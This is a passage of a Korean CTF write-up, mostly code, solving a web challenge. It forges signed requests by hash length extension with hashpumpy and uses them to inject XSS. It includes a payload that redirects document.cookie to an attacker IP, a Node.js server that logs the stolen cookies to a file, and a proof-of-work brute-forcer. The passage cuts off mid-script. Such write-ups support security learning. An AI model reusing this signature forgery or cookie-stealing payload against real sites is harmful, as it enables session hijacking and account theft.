mtki\">import</span><span class=\"mtk1\"> b64encode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> hashpumpy </span><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> hashpump</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_msg </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;Ym9keQ==,7YyA66qo65GQIQ==,&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\"># 팀모두!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_sig </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;9325813a0a951c308d6c5c0c9a462648&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_1  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;header&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;http/1.1&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;404&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_2  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;body&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;&quot;&quot;&lt;script</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&gt;alert(&quot;xss&quot;)</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&lt;/script</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&gt;&quot;&quot;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_3  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;cookie&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;cookies!&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;팀모두 화이팅!&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;http://110.10.147.166/api.php&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">None</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">found</span><span class=\"mtk1\">():</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> i </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span><span class=\"mtk7\">32</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [sig, value] </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">hashpump</span><span class=\"mtk1\">(ori_sig, ori_msg, </span><span class=\"mtk6\">&quot;Test&quot;</span><span class=\"mtk1\">, i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\"> : </span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">eval</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;b&#39;&#39;&#39;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> value </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39;&#39;&#39;&quot;</span><span class=\"mtk1\">)).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\"> : sig}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;??&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">not</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.text</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot; : &quot;</span><span class=\"mtk1\">,i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;found!!!key_length!!!!!! : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(key_len))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> key_len</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[sig, value] </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">hashpump</span><span class=\"mtk1\">(ori_sig, ori_msg, msg_1</span><span class=\"mtk8\">+</span><span class=\"mtk1\">msg_2</span><span class=\"mtk8\">+</span><span class=\"mtk1\">msg_3, </span><span class=\"mtk7\">12</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\"> : </span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(value).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\"> : sig}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">print</span><span class=\"mtk1\">(url</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot;?q=</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&amp;sig=</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(params[</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\">],params[</span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># response = requests.get(url,params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># print(response.text)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># print(response.url)</span></span></span></code></pre>\n<p><a href=\"http://110.10.147.166/api.php?q=WW05a2VRPT0sN1l5QTY2cW82NUdRSVE9PSyAAAAAAAAAAAAAAAAAAAAAAAAwAQAAAAAAAHxhR1ZoWkdWeSxhSFIwY0M4eExqRT0sTkRBMHxZbTlrZVE9PSxQSE5qY21sd2RBbytZV3hsY25Rb0luaHpjeUlwQ2p3dmMyTnlhWEIwQ2o0PSx8WTI5dmEybGwsWTI5dmEybGxjeUU9LDdZeUE2NnFvNjVHUUlPMlpsT3lkdE8yTWhTRT0=&#x26;sig=48695976fc42f4f4f606c74f9d2df444\">http://110.10.147.166/api.php?q=WW05a2VRPT0sN1l5QTY2cW82NUdRSVE9PSyAAAAAAAAAAAAAAAAAAAAAAAAwAQAAAAAAAHxhR1ZoWkdWeSxhSFIwY0M4eExqRT0sTkRBMHxZbTlrZVE9PSxQSE5qY21sd2RBbytZV3hsY25Rb0luaHpjeUlwQ2p3dmMyTnlhWEIwQ2o0PSx8WTI5dmEybGwsWTI5dmEybGxjeUU9LDdZeUE2NnFvNjVHUUlPMlpsT3lkdE8yTWhTRT0=&#x26;sig=48695976fc42f4f4f606c74f9d2df444</a></p>\n<p>이제 이러한 결과물이 나오는데 실제로도 정상적으로 xss가 동작하는 것을 확인할 수 있습니다.</p>\n<p>이제 취약점이 발견된 위의 주소를 report 하면 되는데 이 때 챌린지가 있는데 간단하게 스크립트를 작성하여 해결합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> hashlib</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">i </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">while</span><span class=\"mtk1\"> </span><span class=\"mtk7\">True</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">hash</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> hashlib.</span><span class=\"mtk3\">sha1</span><span class=\"mtk1\">(</span><span class=\"mtk8\">str</span><span class=\"mtk1\">(i).</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">hexdigest</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk8\">hash</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">:</span><span class=\"mtk7\">5</span><span class=\"mtk1\">] </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;eab0e&quot;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(i,</span><span class=\"mtk8\">hash</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    i </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> i </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span></span></span></code></pre>\n<p>여기서 나온 결과 값과 url을 넘겨주면 아무 반응이 없는데 이때 공격 시나리오를 다시 한번 생각 해봅니다.</p>\n<p>문제점이 발견된 URL을 관리자에게 Report을 하였을 때 관리자가 이 URL에 접근을 할 것 이고 이때 xss을 통해 공격을 하여 쿠키 탈취를 시도합니다.</p>\n<p>xss을 통해 쿠키 값을 받을 서버를 만들어 봅니다. 간단하게 node.js을 이용하여 만들었습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"javascript\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">express</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;express&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">app</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">express</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">fs</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;fs&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">expressport</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">80</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">server</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">listen</span><span class=\"mtk1\">(</span><span class=\"mtk4\">expressport</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk6\">`Express server has started on port </span><span class=\"mtk10\">${</span><span class=\"mtk4\">expressport</span><span class=\"mtk10\">}</span><span class=\"mtk6\">`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/cookie&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">cookie</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk3\">param</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;cookie&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">fs</span><span class=\"mtk1\">.</span><span class=\"mtk3\">appendFileSync</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;cookies.txt&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">cookie</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>이제 다시 코드를 수정 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># import os</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> base64 </span><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> b64encode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> hashpumpy </span><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> hashpump</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_msg </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;Ym9keQ==,7YyA66qo65GQIQ==,&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\"># 팀모두!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_sig </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;9325813a0a951c308d6c5c0c9a462648&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_1  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;header&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;http/1.1&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;404&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_2  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;body&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;&quot;&quot;&lt;script</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&gt;document.location=&quot;http://27.96.135.144/cookie?cookie=&quot;+document.cookie;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&lt;/script</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&gt;&quot;&quot;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_3  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;cookie&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;cookies!&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;팀모두 화이팅!&#39;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;http://110.10.147.166/api.php&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">None</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">found</span><span class=\"mtk1\">():</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> i </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span><span class=\"mtk7\">32</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [sig, value] </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">hashpump</span><span class=\"mtk1\">(ori_sig, ori_msg, </span><span class=\"mtk6\">&quot;Test&quot;</span><span class=\"mtk1\">, i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk5 mtki\"># [sig, value] = os.popen(&quot;hashpump -s &#39;{s}&#39; -d &#39;{d}&#39; -a &#39;{a}&#39; -k {k}&quot;.format(s=ori_sig, d=ori_msg, a=&quot;Test&quot;, k=i)).read().strip().split(&#39;\\n&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\"> : </span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">eval</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;b&#39;&#39;&#39;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> value </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39;&#39;&#39;&quot;</span><span class=\"mtk1\">)).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\"> : sig}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;??&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">not</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            breaktoo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.text</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot; : &quot;</span><span 